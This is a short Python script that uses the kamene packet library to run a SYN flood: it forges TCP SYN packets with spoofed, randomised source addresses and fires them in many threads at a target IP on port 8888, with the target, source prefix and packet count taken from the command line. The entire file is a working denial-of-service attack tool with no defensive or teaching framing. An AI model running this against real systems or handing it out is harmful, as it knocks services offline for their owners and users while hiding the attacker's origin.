from kamene.all import *
from kamene.layers.inet import IP, TCP
from kamene.volatile import RandShort
import random
import threading

dst_ip = sys.argv[1]
src_ip_start = sys.argv[2]
num_requests = sys.argv[3]

thread_num = 0
thread_num_mutex = threading.Lock()


def print_number():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}]")
    sys.stdout.flush()
    thread_num_mutex.release()


def attack():
    print_number()

    src_ip = src_ip_start + str(random.randint(40, 50))

    iplayer = IP(dst=dst_ip, src=src_ip)
    tcplayer = TCP(sport=RandShort(), dport=[
                   8888], seq=RandShort(), ack=1000, window=1000, flags="S")

    packet = iplayer / tcplayer

    send(packet)

all_threads = []
for i in range(int(num_requests)):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()
